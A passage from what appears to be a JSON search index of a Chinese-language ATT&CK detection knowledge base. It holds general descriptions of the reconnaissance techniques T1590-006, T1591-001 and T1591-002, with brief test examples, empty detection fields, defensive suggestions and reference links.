\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0d\u540c\u7684\u65b9\u5f0f\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\u6216\u9493\u9c7c\u3002\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff0c\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df)\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\uff0c \u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u7ea2\u961f\u5fc5\u5907\uff1aWEB\u871c\u7f50\u8bc6\u522b\u963b\u65ad\u63d2\u4ef6 https://www.freebuf.com/articles/web/246938.html \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1590-006 https://attack.mitre.org/techniques/T1590/006/ \u7ea2\u961f\u5fc5\u5907\uff1aWEB\u871c\u7f50\u8bc6\u522b\u963b\u65ad\u63d2\u4ef6 https://www.freebuf.com/articles/web/246938.html","title":"T1590-006-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-\u7f51\u7edc\u5b89\u5168\u8bbe\u5907"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/#t1590-006-","text":"","title":"T1590-006-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-\u7f51\u7edc\u5b89\u5168\u8bbe\u5907"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4e8b\u5148\u6536\u96c6\u653b\u51fb\u76ee\u6807\u7684\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u4fe1\u606f\u3002\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f8b\u5982\u5df2\u90e8\u7f72\u7684\u9632\u706b\u5899\uff0c\u5185\u5bb9\u7b5b\u9009\u5668\u548c\u4ee3\u7406/\u5821\u5792\u4e3b\u673a\u7684\u5b58\u5728\u548c\u8be6\u7ec6\u4fe1\u606f\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u9488\u5bf9\u5730\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005\u7684\u7f51\u7edc\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\uff08NIDS\uff09\u6216\u5176\u4ed6\u4e0e\u9632\u5fa1\u6027\u7f51\u7edc\u5b89\u5168\u64cd\u4f5c\u6709\u5173\u7684\u8bbe\u5907\u7684\u4fe1\u606f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0d\u540c\u7684\u65b9\u5f0f\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\u6216\u9493\u9c7c\u3002\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff0c\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df)\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\uff0c \u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/#_1","text":"\u7ea2\u961f\u5fc5\u5907\uff1aWEB\u871c\u7f50\u8bc6\u522b\u963b\u65ad\u63d2\u4ef6 https://www.freebuf.com/articles/web/246938.html","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/#_7","text":"MITRE-ATT&CK-T1590-006 https://attack.mitre.org/techniques/T1590/006/ \u7ea2\u961f\u5fc5\u5907\uff1aWEB\u871c\u7f50\u8bc6\u522b\u963b\u65ad\u63d2\u4ef6 https://www.freebuf.com/articles/web/246938.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/","text":"T1591-001-\u6536\u96c6\u53d7\u5bb3\u8005\u7ec4\u7ec7\u4fe1\u606f-\u786e\u5b9a\u7269\u7406\u4f4d\u7f6e \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u53d7\u5bb3\u8005\u7684\u5b9e\u9645\u4f4d\u7f6e\uff0c\u8fd9\u4e9b\u4f4d\u7f6e\u53ef\u4ee5\u5728\u76ee\u6807\u9501\u5b9a\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5173\u76ee\u6807\u7ec4\u7ec7\u7684\u7269\u7406\u4f4d\u7f6e\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u5173\u952e\u8d44\u6e90\u548c\u57fa\u7840\u7ed3\u6784\u7684\u5b58\u653e\u4f4d\u7f6e\u3002\u5b9e\u9645\u4f4d\u7f6e\u8fd8\u53ef\u4ee5\u6307\u793a\u53d7\u5bb3\u8005\u5728\u54ea\u4e2a\u6cd5\u5f8b\u7ba1\u8f96\u533a\u6216\u673a\u6784\u5185\u5de5\u4f5c\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u201c\u7f51\u7edc\u9493\u9c7c\u8bf1\u9a97\u201d\u76f4\u63a5\u8bf1\u6355\u3002\u76ee\u6807\u7ec4\u7ec7\u7684\u5b9e\u9645\u4f4d\u7f6e\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u53d7\u5bb3\u4eba\u62e5\u6709\u7684\u7f51\u7ad9\u6216\u793e\u4ea4\u5a92\u4f53\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u6b64\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\u4ee5\u83b7\u53d6\u4fe1\u606f\u6216\u641c\u7d22\u5f00\u653e\u7684\u7f51\u7ad9\u6216\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u5f97\u80fd\u529b\uff09\u6216\u521d\u6b65\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\u6216\u786c\u4ef6\u6dfb\u52a0\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4f8b\u5982\u53d7\u5bb3\u8005\u7684\u4e2a\u4eba\u793e\u4ea4\u4fe1\u606f\uff0c\u5fae\u535a\u3001\u5fae\u4fe1\u3001QQ\u7b49\u3002 \u4f8b\u5982\u53d7\u5bb3\u7ec4\u7ec7\u7684\u4f4d\u7f6e\u4fe1\u606f\uff0c\u901a\u8fc7\u5b98\u65b9\u7f51\u7ad9\u5373\u53ef\u67e5\u627e\u5230\u76f8\u5173\u7ec4\u7ec7\u7684\u4f4d\u7f6e\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u65e0 \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1591-001 https://attack.mitre.org/techniques/T1591/001/","title":"T1591-001-\u6536\u96c6\u53d7\u5bb3\u8005\u7ec4\u7ec7\u4fe1\u606f-\u786e\u5b9a\u7269\u7406\u4f4d\u7f6e"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/#t1591-001-","text":"","title":"T1591-001-\u6536\u96c6\u53d7\u5bb3\u8005\u7ec4\u7ec7\u4fe1\u606f-\u786e\u5b9a\u7269\u7406\u4f4d\u7f6e"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u53d7\u5bb3\u8005\u7684\u5b9e\u9645\u4f4d\u7f6e\uff0c\u8fd9\u4e9b\u4f4d\u7f6e\u53ef\u4ee5\u5728\u76ee\u6807\u9501\u5b9a\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5173\u76ee\u6807\u7ec4\u7ec7\u7684\u7269\u7406\u4f4d\u7f6e\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u5173\u952e\u8d44\u6e90\u548c\u57fa\u7840\u7ed3\u6784\u7684\u5b58\u653e\u4f4d\u7f6e\u3002\u5b9e\u9645\u4f4d\u7f6e\u8fd8\u53ef\u4ee5\u6307\u793a\u53d7\u5bb3\u8005\u5728\u54ea\u4e2a\u6cd5\u5f8b\u7ba1\u8f96\u533a\u6216\u673a\u6784\u5185\u5de5\u4f5c\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u201c\u7f51\u7edc\u9493\u9c7c\u8bf1\u9a97\u201d\u76f4\u63a5\u8bf1\u6355\u3002\u76ee\u6807\u7ec4\u7ec7\u7684\u5b9e\u9645\u4f4d\u7f6e\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u53d7\u5bb3\u4eba\u62e5\u6709\u7684\u7f51\u7ad9\u6216\u793e\u4ea4\u5a92\u4f53\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u6b64\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\u4ee5\u83b7\u53d6\u4fe1\u606f\u6216\u641c\u7d22\u5f00\u653e\u7684\u7f51\u7ad9\u6216\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u5f97\u80fd\u529b\uff09\u6216\u521d\u6b65\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\u6216\u786c\u4ef6\u6dfb\u52a0\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/#_1","text":"\u4f8b\u5982\u53d7\u5bb3\u8005\u7684\u4e2a\u4eba\u793e\u4ea4\u4fe1\u606f\uff0c\u5fae\u535a\u3001\u5fae\u4fe1\u3001QQ\u7b49\u3002 \u4f8b\u5982\u53d7\u5bb3\u7ec4\u7ec7\u7684\u4f4d\u7f6e\u4fe1\u606f\uff0c\u901a\u8fc7\u5b98\u65b9\u7f51\u7ad9\u5373\u53ef\u67e5\u627e\u5230\u76f8\u5173\u7ec4\u7ec7\u7684\u4f4d\u7f6e\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/#_2","text":"\u65e0","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/#_7","text":"MITRE-ATT&CK-T1591-001 https://attack.mitre.org/techniques/T1591/001/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/","text":"T1591-002-\u6536\u96c6\u53d7\u5bb3\u8005\u7ec4\u7ec7\u4fe1\u606f-\u4e1a\u52a1\u5173\u7cfb \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005\u7684\u4e1a\u52a1\u5173\u7cfb\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u5728\u76ee\u6807\u786e\u5b9a\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5173\u7ec4\u7ec7\u4e1a\u52a1\u5173\u7cfb\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u5df2\u8fde\u63a5\uff08\u5e76\u53ef\u80fd\u63d0\u5347\u4e86\uff09\u7f51\u7edc\u8bbf\u95ee\u6743\u9650\u7684\u7b2c\u4e8c\u6216\u7b2c\u4e09\u65b9\u7ec4\u7ec7\u6216\u57df\uff08\u4f8b\u5982\uff1a\u6258\u7ba1\u670d\u52a1\u63d0\u4f9b\u5546\uff0c\u627f\u5305\u5546\u7b49\uff09\u3002\u6b64\u4fe1\u606f\u8fd8\u53ef\u80fd\u63ed\u793a\u53d7\u5bb3\u8005\u7684\u786c\u4ef6\u548c\u8f6f\u4ef6\u8d44\u6e90\u7684\u4f9b\u5e94\u94fe\u548c\u8fd0\u9001\u8def\u5f84\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u201c\u7f51\u7edc\u9493\u9c7c\u8bf1\u9a97\u201d\u76f4\u63a5\u8bf1\u6355\u3002\u6709\u5173\u4e1a\u52a1\u5173\u7cfb\u7684\u4fe1\u606f\u4e5f\u53ef\u80fd\u4f1a\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff0c\u793e\u4ea4\u5a92\u4f53\u6216\u53d7\u5bb3\u4eba\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u6b64\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\u4ee5\u83b7\u53d6\u4fe1\u606f\u6216\u641c\u7d22\u5f00\u653e\u7684\u7f51\u7ad9\u6216\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5efa\u7acb\u5e10\u6237\u6216\u635f\u5bb3\u5e10\u6237\uff09\u6216\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff08\u4f8b\u5982\uff1a\u4f9b\u5e94\u94fe\u59a5\u534f\uff0c\u9a71\u52a8\u5f0f\u59a5\u534f\uff0c\u6216\u201c\u4fe1\u4efb\u5173\u7cfb\u201d\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4f8b\u5982\u53d7\u5bb3\u8005\u7684\u4e2a\u4eba\u793e\u4ea4\u4fe1\u606f\uff0c\u5fae\u535a\u3001\u5fae\u4fe1\u3001QQ\u7b49\u3002 \u4f8b\u5982\u53d7\u5bb3\u7ec4\u7ec7\u7684\u4e0a\u4e0b\u6e38\u5173\u7cfb\uff0c\u6bd4\u5982\u6bcd\u5b50\u516c\u53f8\u5173\u7cfb\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u65e0 \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1591-002 